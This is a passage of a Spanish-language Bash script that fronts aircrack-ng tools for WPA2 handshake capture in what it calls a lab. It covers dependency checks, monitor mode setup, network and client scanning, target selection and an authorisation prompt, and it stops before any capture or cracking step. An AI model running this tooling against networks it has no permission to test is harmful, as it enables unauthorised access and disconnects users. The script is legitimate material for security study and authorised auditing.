#!/usr/bin/env bash
set -uo pipefail

APP_NAME="CSH WPA-2 FRAMEWORK"
APP_SUBTITLE="Lab Console"

APP_VERSION="2.0"

INTERFACE=""
ORIGINAL_IFACE=""          # interfaz "managed" original, para restaurar
SCAN_SECONDS=12
CAPTURE_TIMEOUT=300
CAPTURE_DIR="captures"
REPORT_DIR="reports"
WORDLIST_DIR="wordlists"
HASH_DIR="hashes"          # capturas convertidas a formato hashcat 22000

# Capacidades opcionales (se autodetectan en require_deps)
HAS_TSHARK=0
HAS_HASHCAT=0
HAS_HCXTOOLS=0
HAS_CRUNCH=0

TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_SSID=""
TARGET_PRIVACY=""
TARGET_AUTH=""
TARGET_CIPHER=""
TARGET_POWER=""
TARGET_BEACONS=""

LAST_CAP=""
LAST_FILTERED_CAP=""
LAST_SCAN_CSV=""
LAST_22000=""
SELECTED_CLIENT=""
SELECTED_WORDLIST=""

AIRODUMP_PID=""
SCAN_PID=""
TMP_DIR=""
AUTHORIZED_SESSION=0

NO_COLOR=0
if [[ ! -t 1 || "${TERM:-}" == "dumb" ]]; then
    NO_COLOR=1
fi

if (( NO_COLOR == 0 )); then
    BOLD="\033[1m"
    DIM="\033[2m"
    GREEN="\033[32m"
    RED="\033[31m"
    YELLOW="\033[33m"
    BLUE="\033[34m"
    CYAN="\033[36m"
    MAGENTA="\033[35m"
    WHITE="\033[97m"
    DARK_GREY="\033[38;5;238m"
    ORANGE="\033[38;5;208m"
    RESET="\033[0m"
else
    BOLD=""; DIM=""; GREEN=""; RED=""; YELLOW=""; BLUE=""; CYAN=""; MAGENTA=""; WHITE=""; DARK_GREY=""; ORANGE=""; RESET=""
fi

trap 'cleanup_all; exit 130' INT TERM
trap 'cleanup_all' EXIT

term_width() {
    local cols
    cols="$(tput cols 2>/dev/null || echo 80)"
    [[ "$cols" =~ ^[0-9]+$ ]] || cols=80
    (( cols < 40 )) && cols=40
    echo "$cols"
}

strip_ansi() {
    sed -E 's/\x1B\[[0-9;]*[mK]//g'
}

visible_len() {
    local clean
    clean="$(printf "%b" "$1" | strip_ansi)"
    printf "%s" "${#clean}"
}

repeat_char() {
    local char="$1"
    local count="$2"
    local out=""
    (( count < 0 )) && count=0
    printf -v out "%${count}s" ""
    printf "%s" "${out// /$char}"
}

line() {
    local cols
    cols="$(term_width)"
    printf "%b%s%b\n" "$DARK_GREY" "$(repeat_char '━' "$cols")" "$RESET"
}

center_text() {
    local text="$1"
    local cols len pad
    cols="$(term_width)"
    len="$(visible_len "$text")"
    pad=$(( (cols - len) / 2 ))
    (( pad < 0 )) && pad=0
    printf "%*s%b\n" "$pad" "" "$text"
}

center_block() {
    local color="${1:-$WHITE}"
    local block line_txt clean cols len pad
    block="$(cat)"
    cols="$(term_width)"
    printf "%b" "$color"
    while IFS= read -r line_txt; do
        clean="$(printf "%s" "$line_txt" | strip_ansi)"
        len=${#clean}
        pad=$(( (cols - len) / 2 ))
        (( pad < 0 )) && pad=0
        printf "%*s%s\n" "$pad" "" "$line_txt"
    done <<< "$block"
    printf "%b" "$RESET"
}

clear_screen() {
    clear 2>/dev/null || printf '\033c'
}

csh_logo() {

    local SCRIPT_DIR
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

    local LOGO="${SCRIPT_DIR}/CSH_Logo.png"

    if [[ ! -f "$LOGO" ]]; then
        center_text "${RED}No se encontró CSH_Logo.png${RESET}"
        return
    fi

    if ! command -v chafa >/dev/null 2>&1; then
        center_text "${RED}chafa no está instalado${RESET}"
        center_text "${DIM}sudo dnf install chafa${RESET}"
        return
    fi

    local COLS
    local ROWS

    COLS=$(tput cols)
    ROWS=$(tput lines)

    local WIDTH=$(( COLS - 6 ))
    (( WIDTH > 160 )) && WIDTH=160
    (( WIDTH < 60 )) && WIDTH=60

    local HEIGHT=$(( ROWS / 3 ))
    (( HEIGHT > 24 )) && HEIGHT=24
    (( HEIGHT < 10 )) && HEIGHT=10

    chafa \
        --symbols=all \
        --fill=block \
        --center=on \
        --size="${WIDTH}x${HEIGHT}" \
        "$LOGO"

    echo
}

mini_status_bar() {
    local label="$1"
    local total=28
    local i bar filled empty
    echo ""
    for ((i=1; i<=total; i++)); do
        filled="$(repeat_char '█' "$i")"
        empty="$(repeat_char '░' $((total-i)))"
        bar="${filled}${empty}"
        printf "\r%b%s%b %b%s%b %3d%%" "$DIM" "$label" "$RESET" "$CYAN" "$bar" "$RESET" $(( i * 100 / total ))
        sleep 0.02
    done
    echo ""
}

splash_screen() {
    clear_screen
    tput civis 2>/dev/null || true
    echo ""
    echo ""
    csh_logo "$WHITE"
    center_text "${DIM}${APP_SUBTITLE}${RESET}"
    center_text "${DARK_GREY}────────────────────────────────────────${RESET}"
    mini_status_bar "Cargando consola"
    center_text "${GREEN}✓ Entorno visual listo${RESET}"
    sleep 0.25
    tput cnorm 2>/dev/null || true
}

header() {
    clear_screen
    echo ""
    csh_logo "$WHITE"
    center_text "${BOLD}${CYAN}${APP_NAME}${RESET}"
    center_text "${DIM}${APP_SUBTITLE}${RESET}"
    line
}

title() {
    header
    printf "%b  %s%b\n" "$BOLD$CYAN" "$1" "$RESET"
    line
}

section() {
    echo ""
    printf "%b%s%b\n" "$BOLD$MAGENTA" "$1" "$RESET"
    printf "%b%s%b\n" "$DIM" "────────────────────────────────────────────────────────────────────────────" "$RESET"
}

ok() { printf "%b✓%b %s\n" "$GREEN" "$RESET" "$1"; }
warn() { printf "%b!%b %s\n" "$YELLOW" "$RESET" "$1"; }
err() { printf "%b✗%b %s\n" "$RED" "$RESET" "$1"; }

pause() {
    echo ""
    read -r -p "Presiona ENTER para continuar..."
}

cleanup_runtime() {
    tput cnorm 2>/dev/null || true

    if [[ -n "${AIRODUMP_PID:-}" ]]; then
        kill "$AIRODUMP_PID" 2>/dev/null || true
        wait "$AIRODUMP_PID" 2>/dev/null || true
        AIRODUMP_PID=""
    fi

    if [[ -n "${SCAN_PID:-}" ]]; then
        kill "$SCAN_PID" 2>/dev/null || true
        wait "$SCAN_PID" 2>/dev/null || true
        SCAN_PID=""
    fi
}

cleanup_temp() {
    if [[ -n "${TMP_DIR:-}" && -d "$TMP_DIR" ]]; then
        rm -rf "$TMP_DIR" 2>/dev/null || true
        TMP_DIR=""
    fi
}

cleanup_all() {
    cleanup_runtime
    cleanup_temp
}

safe_filename() {
    local raw="${1:-unknown}"
    raw="${raw//<hidden>/hidden}"
    raw="$(printf "%s" "$raw" | tr '[:space:]/:' '___' | sed -E 's/[^A-Za-z0-9._-]+/_/g; s/_+/_/g; s/^_//; s/_$//')"
    [[ -n "$raw" ]] || raw="unknown"
    printf "%s" "$raw"
}

usage() {
    cat <<EOF_USAGE
Uso:
  sudo $0 [opciones]

Opciones:
  -i, --interface IFACE       Interfaz WiFi. Puede estar en managed o monitor.
  --scan-time SEGUNDOS        Tiempo de escaneo inicial. Default: $SCAN_SECONDS
  --capture-time SEGUNDOS     Timeout de captura. Default: $CAPTURE_TIMEOUT
  --no-color                  Desactiva colores ANSI.
  -h, --help                  Mostrar ayuda.

Ejemplos:
  sudo $0
  sudo $0 -i wlp0s20f0u1
  sudo $0 -i wlp0s20f0u1mon --scan-time 15
EOF_USAGE
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -i|--interface)
                INTERFACE="${2:-}"
                shift 2
                ;;
            --scan-time)
                SCAN_SECONDS="${2:-}"
                shift 2
                ;;
            --capture-time)
                CAPTURE_TIMEOUT="${2:-}"
                shift 2
                ;;
            --no-color)
                NO_COLOR=1
                shift
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            *)
                err "Opción desconocida: $1"
                usage
                exit 1
                ;;
        esac
    done

    if [[ ! "$SCAN_SECONDS" =~ ^[0-9]+$ || "$SCAN_SECONDS" -lt 3 ]]; then
        err "--scan-time debe ser un entero >= 3."
        exit 1
    fi

    if [[ ! "$CAPTURE_TIMEOUT" =~ ^[0-9]+$ || "$CAPTURE_TIMEOUT" -lt 10 ]]; then
        err "--capture-time debe ser un entero >= 10."
        exit 1
    fi
}


require_bash() {
    if (( BASH_VERSINFO[0] < 4 )); then
        err "Se requiere Bash 4 o superior."
        exit 1
    fi
}

require_root() {
    if [[ $EUID -ne 0 ]]; then
        err "Ejecuta con sudo:"
        echo "  sudo $0"
        exit 1
    fi
}

require_deps() {
    local missing=0
    local required=(
        iw
        ip
        awk
        grep
        sort
        sed
        date
        chafa
        airodump-ng
        aireplay-ng
        aircrack-ng
        airmon-ng
    )
    for cmd in "${required[@]}"; do
        if command -v "$cmd" >/dev/null 2>&1; then
            ok "$cmd instalado"
        else
            err "Falta: $cmd"
            missing=1
        fi
    done

    if (( missing == 1 )); then
        echo ""
        echo "Instala dependencias en Fedora:"
        echo "  sudo dnf install aircrack-ng iw iproute procps-ng"
        exit 1
    fi

    echo ""
    section "Herramientas opcionales (desbloquean funciones extra)"

    if command -v tshark >/dev/null 2>&1; then
        HAS_TSHARK=1
        ok "tshark — permite generar CAP filtrado por objetivo"
    else
        HAS_TSHARK=0
        warn "tshark ausente → sin CAP filtrado   (sudo dnf install wireshark-cli)"
    fi

    if command -v hashcat >/dev/null 2>&1; then
        HAS_HASHCAT=1
        ok "hashcat — cracking por GPU con formato 22000"
    else
        HAS_HASHCAT=0
        warn "hashcat ausente → sin cracking GPU   (sudo dnf install hashcat)"
    fi

    if command -v hcxpcapngtool >/dev/null 2>&1; then
        HAS_HCXTOOLS=1
        ok "hcxpcapngtool — conversión .cap → .22000 (hashcat/PMKID)"
    else
        HAS_HCXTOOLS=0
        warn "hcxtools ausente → sin conversión 22000   (sudo dnf install hcxtools)"
    fi

    if command -v crunch >/dev/null 2>&1; then
        HAS_CRUNCH=1
        ok "crunch — generación de diccionarios por patrón"
    else
        HAS_CRUNCH=0
        warn "crunch ausente → generador de wordlists limitado   (sudo dnf install crunch)"
    fi
}

list_wifi_interfaces() {
    iw dev 2>/dev/null | awk '
        /^phy#/ { phy=$1 }
        /^[[:space:]]*Interface/ {
            if (iface != "") print phy "|" iface "|" type "|" addr "|" channel "|" txpower
            iface=$2; type="N/A"; addr="N/A"; channel="N/A"; txpower="N/A"
        }
        /^[[:space:]]*addr/ { addr=$2 }
        /^[[:space:]]*type/ { type=$2 }
        /^[[:space:]]*channel/ { channel=$2 }
        /^[[:space:]]*txpower/ { txpower=$2 " " $3 }
        END { if (iface != "") print phy "|" iface "|" type "|" addr "|" channel "|" txpower }
    ' | grep -Ev '\|P2P-device\|' || true
}

interface_exists() {
    local iface="$1"
    [[ -n "$iface" ]] && iw dev "$iface" info >/dev/null 2>&1
}

get_iface_type() {
    [[ -n "$INTERFACE" ]] || { echo "N/A"; return; }
    iw dev "$INTERFACE" info 2>/dev/null | awk '/type/ {print $2; exit}'
}

get_iface_mac() {
    [[ -n "$INTERFACE" ]] || { echo "N/A"; return; }
    iw dev "$INTERFACE" info 2>/dev/null | awk '/addr/ {print $2; exit}'
}

get_iface_channel() {
    [[ -n "$INTERFACE" ]] || { echo "N/A"; return; }
    iw dev "$INTERFACE" info 2>/dev/null | awk '/channel/ {print $2; exit}'
}

get_iface_frequency() {
    [[ -n "$INTERFACE" ]] || { echo "N/A"; return; }
    iw dev "$INTERFACE" info 2>/dev/null | awk '
        /channel/ {
            gsub(/[()]/, "", $3)
            print $3 " MHz"
            exit
        }
    '
}

get_iface_txpower() {
    [[ -n "$INTERFACE" ]] || { echo "N/A"; return; }
    iw dev "$INTERFACE" info 2>/dev/null | awk '/txpower/ {print $2 " " $3; exit}'
}

show_interface_info() {
    if [[ -z "$INTERFACE" ]]; then
        printf "%-22s %s\n" "Interfaz:" "No seleccionada"
        return
    fi

    printf "%-22s %s\n" "Interfaz:" "$INTERFACE"
    printf "%-22s %s\n" "Modo:" "$(get_iface_type)"
    printf "%-22s %s\n" "MAC:" "$(get_iface_mac)"
    printf "%-22s %s\n" "Canal actual:" "$(get_iface_channel)"
    printf "%-22s %s\n" "Frecuencia actual:" "$(get_iface_frequency)"
    printf "%-22s %s\n" "Potencia TX:" "$(get_iface_txpower)"
}

select_interface() {
    local force="${1:-0}"

    if (( force == 0 )) && [[ -n "$INTERFACE" ]] && interface_exists "$INTERFACE"; then
        return 0
    fi

    while true; do
        title "SELECCIÓN DE INTERFAZ WIFI"
        section "Interfaces detectadas"

        mapfile -t IFACES < <(list_wifi_interfaces)

        if (( ${#IFACES[@]} == 0 )); then
            err "No se detectaron interfaces WiFi con iw."
            echo ""
            echo "Revisa:"
            echo "  iw dev"
            echo "  rfkill list"
            echo "  sudo dmesg | grep -i firmware"
            pause
            return 1
        fi

        printf "%-4s %-10s %-18s %-12s %-20s %-8s %s\n" "N°" "PHY" "INTERFAZ" "MODO" "MAC" "CANAL" "TX"
        echo "────────────────────────────────────────────────────────────────────────────────────────────"

        local i=1 item phy iface type mac channel tx
        for item in "${IFACES[@]}"; do
            IFS='|' read -r phy iface type mac channel tx <<< "$item"
            printf "%-4s %-10s %-18s %-12s %-20s %-8s %s\n" "$i" "$phy" "$iface" "$type" "$mac" "$channel" "$tx"
            i=$((i + 1))
        done

        echo ""
        echo "r. Refrescar"
        echo "m. Ingresar interfaz manualmente"
        echo "0. Salir"
        echo ""
        read -r -p "Selecciona interfaz: " choice

        case "$choice" in
            r|R)
                continue
                ;;
            m|M)
                read -r -p "Nombre de interfaz: " manual
                if interface_exists "$manual"; then
                    INTERFACE="$manual"
                    ok "Interfaz seleccionada: $INTERFACE"
                    pause
                    return 0
                fi
                err "No existe: $manual"
                pause
                ;;
            0)
                exit 0
                ;;
            *)
                if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#IFACES[@]} )); then
                    IFS='|' read -r _ INTERFACE _ _ _ _ <<< "${IFACES[$((choice-1))]}"
                    ok "Interfaz seleccionada: $INTERFACE"
                    pause
                    return 0
                fi
                err "Selección inválida."
                pause
                ;;
        esac
    done
}

ensure_monitor_mode() {
    select_interface 0 || return 1

    local type
    type="$(get_iface_type)"

    if [[ "$type" == "monitor" ]]; then
        return 0
    fi

    # Recordar la interfaz managed original para poder restaurarla luego.
    [[ -z "$ORIGINAL_IFACE" ]] && ORIGINAL_IFACE="$INTERFACE"

    title "MODO MONITOR"
    section "Interfaz actual"
    show_interface_info

    warn "La interfaz '$INTERFACE' está en modo '${type:-N/A}', no en monitor."
    warn "El modo monitor puede desconectar temporalmente la conexión WiFi de esa tarjeta."
    echo ""
    echo "1. Activar con airmon-ng start $INTERFACE"
    echo "2. Intentar cambiar tipo con iw directamente"
    echo "3. Seleccionar otra interfaz"
    echo "0. Cancelar"
    echo ""
    read -r -p "Selecciona opción: " opt

    case "$opt" in
        1)
            echo ""
            read -r -p "¿Ejecutar 'airmon-ng check kill' antes? Esto puede cerrar NetworkManager/wpa_supplicant. [s/N]: " kill_net
            if [[ "$kill_net" =~ ^[sS]$ ]]; then
                airmon-ng check kill || true
            fi

            section "Activando monitor"
            local before after candidates monitor_iface
            before="$(list_wifi_interfaces | cut -d'|' -f2 | sort | tr '\n' ' ')"
            airmon-ng start "$INTERFACE"
            sleep 1
            after="$(list_wifi_interfaces)"

            monitor_iface="$(printf "%s\n" "$after" | awk -F'|' '$3 == "monitor" {print $2}' | grep -E "^${INTERFACE}mon$|^mon${INTERFACE}$|^${INTERFACE}$" | head -n 1 || true)"
            if [[ -z "$monitor_iface" ]]; then
                monitor_iface="$(printf "%s\n" "$after" | awk -F'|' '$3 == "monitor" {print $2}' | head -n 1 || true)"
            fi

            if [[ -n "$monitor_iface" ]]; then
                INTERFACE="$monitor_iface"
                ok "Modo monitor activo en: $INTERFACE"
                pause
                return 0
            fi

            warn "No pude detectar automáticamente la interfaz monitor. Selecciónala manualmente."
            pause
            select_interface 1 || return 1
            [[ "$(get_iface_type)" == "monitor" ]]
            return $?
            ;;
        2)
            section "Activando monitor con iw"
            ip link set "$INTERFACE" down || true
            iw dev "$INTERFACE" set type monitor || true
            ip link set "$INTERFACE" up || true
            sleep 1
            if [[ "$(get_iface_type)" == "monitor" ]]; then
                ok "Modo monitor activo en: $INTERFACE"
                pause
                return 0
            fi
            err "No se pudo activar monitor con iw. Prueba airmon-ng."
            pause
            return 1
            ;;
        3)
            select_interface 1 || return 1
            ensure_monitor_mode
            ;;
        0)
            return 1
            ;;
        *)
            err "Opción inválida."
            pause
            return 1
            ;;
    esac
}

restore_managed_mode() {
    title "RESTAURAR WIFI NORMAL (MANAGED)"

    local target="$INTERFACE"
    local type
    type="$(get_iface_type)"

    if [[ -z "$target" ]]; then
        warn "No hay interfaz seleccionada."
        pause
        return
    fi

    if [[ "$type" != "monitor" ]]; then
        ok "La interfaz '$target' ya está en modo '${type:-managed}'. No hay nada que restaurar."
        pause
        return
    fi

    section "Interfaz actual"
    show_interface_info

    warn "Se devolverá '$target' a modo managed y se reactivará NetworkManager."
    echo ""
    read -r -p "¿Continuar? [s/N]: " go
    [[ "$go" =~ ^[sS]$ ]] || { warn "Cancelado."; pause; return; }

    section "Restaurando"
    cleanup_runtime

    local restored=""

    # 1) Si airmon-ng creó una interfaz tipo 'wlan0mon', intentamos 'airmon-ng stop'.
    if command -v airmon-ng >/dev/null 2>&1; then
        warn "Intentando 'airmon-ng stop $target'..."
        airmon-ng stop "$target" >/dev/null 2>&1 || true
        sleep 1
    fi

    # 2) Determinar qué interfaz quedó viva para forzarla a managed con iw.
    if interface_exists "$target"; then
        restored="$target"
    elif [[ -n "$ORIGINAL_IFACE" ]] && interface_exists "$ORIGINAL_IFACE"; then
        restored="$ORIGINAL_IFACE"
    else
        restored="$(list_wifi_interfaces | awk -F'|' '$3 != "monitor" {print $2; exit}')"
    fi

    if [[ -n "$restored" ]]; then
        ip link set "$restored" down 2>/dev/null || true
        iw dev "$restored" set type managed 2>/dev/null || true
        ip link set "$restored" up 2>/dev/null || true
        INTERFACE="$restored"
    fi

    warn "Reactivando NetworkManager..."
    systemctl start NetworkManager >/dev/null 2>&1 || true
    sleep 1

    section "Resultado"
    if [[ "$(get_iface_type)" != "monitor" ]]; then
        ok "Interfaz '$INTERFACE' restaurada a modo managed."
        ORIGINAL_IFACE=""
    else
        err "No se pudo confirmar el cambio. Revisa manualmente:"
        echo "  sudo ip link set $INTERFACE down"
        echo "  sudo iw dev $INTERFACE set type managed"
        echo "  sudo ip link set $INTERFACE up"
        echo "  sudo systemctl restart NetworkManager"
    fi

    show_interface_info
    pause
}

parse_networks() {
    local csv="$1"

    awk -F',' '
        function trim(s) {
            gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", s)
            return s
        }
        $1 == "BSSID" { in_ap = 1; next }
        $1 == "Station MAC" { in_ap = 0 }
        in_ap && $1 ~ /^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$/ {
            bssid = trim($1)
            channel = trim($4)
            privacy = trim($6)
            cipher = trim($7)
            auth = trim($8)
            power = trim($9)
            beacons = trim($10)
            essid = trim($14)
            if (essid == "") essid = "<hidden>"
            printf "%s|%s|%s|%s|%s|%s|%s|%s\n", bssid, channel, power, privacy, cipher, auth, beacons, essid
        }
    ' "$csv" 2>/dev/null
}

parse_clients_for_bssid() {
    local csv="$1"
    local bssid="$2"

    awk -F',' -v target="$bssid" '
        function trim(s) {
            gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", s)
            return s
        }
        $1 == "Station MAC" { in_station = 1; next }
        in_station && $1 ~ /^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$/ {
            station = trim($1)
            power = trim($4)
            packets = trim($5)
            associated = trim($6)
            probed = trim($7)
            if (tolower(associated) == tolower(target)) {
                printf "%s|%s|%s|%s\n", station, power, packets, probed
            }
        }
    ' "$csv" 2>/dev/null
}

# Normaliza privacy/auth/cipher de airodump a una etiqueta corta de cifrado.
encr_label() {
    local privacy="$1" auth="$2"
    local blob="$privacy $auth"
    if   echo "$blob" | grep -qi "WPA3\|SAE"; then echo "WPA3"
    elif echo "$blob" | grep -qi "WPA2";       then echo "WPA2"
    elif echo "$blob" | grep -qi "WPA";        then echo "WPA"
    elif echo "$blob" | grep -qi "WEP";        then echo "WEP"
    elif echo "$blob" | grep -qiE "OPN|Open";  then echo "OPN"
    else echo "?"
    fi
}

encr_color() {
    case "$1" in
        WPA3) printf "%b" "$MAGENTA" ;;   # SAE: no se valida con aircrack clásico
        WPA2) printf "%b" "$GREEN"   ;;   # objetivo típico de laboratorio
        WPA)  printf "%b" "$YELLOW"  ;;
        WEP)  printf "%b" "$RED"     ;;
        OPN)  printf "%b" "$CYAN"    ;;
        *)    printf "%b" "$WHITE"   ;;
    esac
}

# Barra de señal de 4 segmentos + dBm, coloreada por intensidad.
power_meter() {
    local pwr="$1"
    [[ "$pwr" =~ ^-?[0-9]+$ ]] || { printf "····  n/a"; return; }
    local v="$pwr"
    (( v > 0 )) && v=$(( -v ))
    if (( v == -1 )); then printf "····  n/a"; return; fi

    local level color
    if   (( v >= -55 )); then level=4; color="$GREEN"
    elif (( v >= -67 )); then level=3; color="$GREEN"
    elif (( v >= -75 )); then level=2; color="$YELLOW"
    elif (( v >= -85 )); then level=1; color="$RED"
    else                       level=0; color="$RED"
    fi

    local bar="" seg
    for seg in 1 2 3 4; do
        if (( seg <= level )); then bar+="▇"; else bar+="·"; fi
    done
    printf "%b%s%b %4sdBm" "$color" "$bar" "$RESET" "$v"
}

# Cuenta clientes asociados a un BSSID en el CSV dado (silencioso si no hay CSV).
count_clients() {
    local csv="$1" bssid="$2" n
    [[ -n "$csv" && -f "$csv" ]] || { echo 0; return; }
    n=$(parse_clients_for_bssid "$csv" "$bssid" | grep -c .)
    echo "${n:-0}"
}

print_network_table() {
    local arr_name="$1"
    local csv="${2:-$LAST_SCAN_CSV}"
    local -n arr_ref="$arr_name"

    printf "%b%-4s %-22s %-19s %-4s %-5s %-3s %s%b\n" \
        "$BOLD" "N°" "ESSID" "BSSID" "CH" "ENCR" "CL" "SEÑAL" "$RESET"
    printf "%b%s%b\n" "$DARK_GREY" "$(repeat_char '─' 78)" "$RESET"

    local i=1 item bssid channel power privacy cipher auth beacons ssid enc ecolor clients name
    for item in "${arr_ref[@]}"; do
        IFS='|' read -r bssid channel power privacy cipher auth beacons ssid <<< "$item"
        enc="$(encr_label "$privacy" "$auth")"
        ecolor="$(encr_color "$enc")"
        clients="$(count_clients "$csv" "$bssid")"
        name="$ssid"
        [[ "$name" == "<hidden>" ]] && name="· oculta ·"

        printf "%-4s %-22.22s %-19s %-4s ${ecolor}%-5s${RESET} %b%-3s%b %s\n" \
            "$i" "$name" "$bssid" "$channel" "$enc" \
            "$([[ "$clients" -gt 0 ]] && printf "%b" "$CYAN" || printf "%b" "$DIM")" "$clients" "$RESET" \
            "$(power_meter "$power")"
        i=$((i + 1))
    done
    echo ""
    printf "%b" "$DIM"
    echo "Leyenda: ENCR → ${RESET}${MAGENTA}WPA3${RESET}${DIM} (SAE, no aircrack) · ${RESET}${GREEN}WPA2${RESET}${DIM} · ${RESET}${YELLOW}WPA${RESET}${DIM} · ${RESET}${RED}WEP${RESET}${DIM} · ${RESET}${CYAN}OPN${RESET}${DIM}   CL = clientes asociados${RESET}"
}

channel_to_freq() {
    local ch="$1"
    if [[ "$ch" =~ ^[0-9]+$ ]]; then
        if (( ch >= 1 && ch <= 13 )); then
            echo "$((2407 + ch * 5)) MHz"
        elif (( ch == 14 )); then
            echo "2484 MHz"
        elif (( ch >= 32 )); then
            echo "$((5000 + ch * 5)) MHz"
        else
            echo "N/A"
        fi
    else
        echo "N/A"
    fi
}

set_target_channel() {
    [[ -n "$TARGET_CHANNEL" ]] || return 1
    warn "Fijando $INTERFACE en canal $TARGET_CHANNEL..."
    ip link set "$INTERFACE" down 2>/dev/null || true
    iw dev "$INTERFACE" set channel "$TARGET_CHANNEL" 2>/dev/null || true
    ip link set "$INTERFACE" up 2>/dev/null || true
    sleep 1
}

scan_networks() {
    ensure_monitor_mode || return 1

    title "SCANNER WIFI"
    section "Interfaz"
    show_interface_info

    section "Escaneo"
    warn "Escaneando redes durante $SCAN_SECONDS segundos."
    warn "Esto escucha redes cercanas; no envía tramas de ataque."

    cleanup_runtime
    cleanup_temp
    TMP_DIR="$(mktemp -d)"
    local prefix="$TMP_DIR/scan"
    local csv="${prefix}-01.csv"

    airodump-ng --write "$prefix" --output-format csv "$INTERFACE" >/dev/null 2>&1 &
    SCAN_PID=$!

    tput civis 2>/dev/null || true
    local s
    for ((s=SCAN_SECONDS; s>=1; s--)); do
        printf "\rTiempo restante: %b%ss%b   " "$BOLD" "$s" "$RESET"
        sleep 1
    done
    echo ""

    kill "$SCAN_PID" 2>/dev/null || true
    wait "$SCAN_PID" 2>/dev/null || true
    SCAN_PID=""
    tput cnorm 2>/dev/null || true

    if [[ ! -f "$csv" ]]; then
        err "No se generó CSV de escaneo."
        pause
        return 1
    fi

    mapfile -t SCAN_RESULTS < <(parse_networks "$csv" | sort -t'|' -k3,3nr)

    if (( ${#SCAN_RESULTS[@]} == 0 )); then
        err "No se detectaron redes."
        pause
        return 1
    fi

    section "Redes detectadas"
    print_network_table SCAN_RESULTS "$csv"

    section "Selección"
    local choice idx selected
    read -r -p "Selecciona el número de tu red objetivo: " choice

    if [[ ! "$choice" =~ ^[0-9]+$ ]]; then
        err "Selección inválida."
        pause
        return 1
    fi

    idx=$((choice - 1))
    if (( idx < 0 || idx >= ${#SCAN_RESULTS[@]} )); then
        err "Número fuera de rango."
        pause
        return 1
    fi

    selected="${SCAN_RESULTS[$idx]}"
    IFS='|' read -r TARGET_BSSID TARGET_CHANNEL TARGET_POWER TARGET_PRIVACY TARGET_CIPHER TARGET_AUTH TARGET_BEACONS TARGET_SSID <<< "$selected"
    LAST_SCAN_CSV="$csv"

    ok "Objetivo seleccionado: $TARGET_SSID / $TARGET_BSSID / canal $TARGET_CHANNEL"
    pause
}

show_target_info() {
    title "INFORMACIÓN DEL OBJETIVO"

    if [[ -z "$TARGET_BSSID" ]]; then
        err "Aún no hay objetivo seleccionado."
        pause
        return
    fi

    section "Red objetivo"
    printf "%-22s %s\n" "SSID:" "$TARGET_SSID"
    printf "%-22s %s\n" "BSSID / MAC AP:" "$TARGET_BSSID"
    printf "%-22s %s\n" "Canal:" "$TARGET_CHANNEL"
    printf "%-22s %s\n" "Frecuencia aprox:" "$(channel_to_freq "$TARGET_CHANNEL")"
    printf "%-22s %s\n" "Potencia:" "$TARGET_POWER"
    printf "%-22s %s\n" "Privacidad:" "$TARGET_PRIVACY"
    printf "%-22s %s\n" "Cifrado:" "$TARGET_CIPHER"
    printf "%-22s %s\n" "Autenticación:" "$TARGET_AUTH"
    printf "%-22s %s\n" "Beacons:" "$TARGET_BEACONS"

    section "Interpretación rápida"
    if echo "$TARGET_PRIVACY $TARGET_AUTH" | grep -qi "WPA3\|SAE"; then
        warn "La red anuncia WPA3/SAE. Aircrack clásico no valida SAE como WPA2-PSK."
    fi

    if echo "$TARGET_AUTH" | grep -qi "PSK"; then
        ok "PSK detectado. En un laboratorio autorizado se puede validar handshake WPA/WPA2-Personal."
    else
        warn "No se detectó PSK claro en el CSV. Revisa privacidad/autenticación antes de capturar."
    fi

    section "Clientes asociados detectados en último escaneo"
    if [[ -n "$LAST_SCAN_CSV" && -f "$LAST_SCAN_CSV" ]]; then
        mapfile -t CLIENTS < <(parse_clients_for_bssid "$LAST_SCAN_CSV" "$TARGET_BSSID")
        if (( ${#CLIENTS[@]} == 0 )); then
            warn "No se detectaron clientes asociados en el último escaneo."
            echo "Para handshake normalmente necesitas que un cliente se conecte o reconecte."
        else
            printf "%-4s %-19s %-8s %-10s %s\n" "N°" "CLIENTE" "PWR" "PACKETS" "PROBED"
            echo "────────────────────────────────────────────────────────────────────────"
            local i=1 item station power packets probed
            for item in "${CLIENTS[@]}"; do
                IFS='|' read -r station power packets probed <<< "$item"
                printf "%-4s %-19s %-8s %-10s %s\n" "$i" "$station" "$power" "$packets" "$probed"
                i=$((i + 1))
            done
        fi
    else
        warn "No hay CSV de escaneo disponible para clientes."
    fi

    section "Última captura"
    if [[ -n "$LAST_CAP" && -f "$LAST_CAP" ]]; then
        echo "$LAST_CAP"
        ls -lh "$LAST_CAP"
    else
        warn "Aún no hay captura registrada."
    fi

    pause
}

confirm_authorized_action() {
    local action="$1"

    if (( AUTHORIZED_SESSION == 1 )); then
        return 0
    fi

    title "CONFIRMACIÓN DE AUTORIZACIÓN"
    warn "La acción '$action' puede interrumpir clientes WiFi temporalmente."
    warn "Continúa solo si es tu red, tu laboratorio o tienes permiso explícito."
    echo ""
    read -r -p "Escribe AUTORIZADO para continuar: " confirmation

    if [[ "$confirmation" != "AUTORIZADO" ]]; then
        err "Acción cancelada."
        pause
        return 1
    fi

    read -r -p "¿Recordar autorización durante esta sesión? [s/N]: " remember
    if [[ "$remember" =~ ^[sS]$ ]]; then
        AUTHORIZED_SESSION=1
    fi

    return 0
}

select_client_optional() {
    SELECTED_CLIENT=""

    if [[ -z "$LAST_SCAN_CSV" || ! -f "$LAST_SCAN_CSV" ]]; then
        warn "No hay CSV de escaneo reciente para listar clientes. Se usará AP general."
        return 0
    fi

    mapfile -t CLIENTS < <(parse_clients_for_bssid "$LAST_SCAN_CSV" "$TARGET_BSSID")
    if (( ${#CLIENTS[@]} == 0 )); then
        warn "No se detectaron clientes. Se usará AP general."
        return 0
    fi

    section "Clientes detectados"
    printf "%-4s %-19s %-8s %-10s %s\n" "N°" "CLIENTE" "PWR" "PACKETS" "PROBED"
    echo "────────────────────────────────────────────────────────────────────────"

    local i=1 item station power packets probed choice idx
    for item in "${CLIENTS[@]}"; do
        IFS='|' read -r station power packets probed <<< "$item"
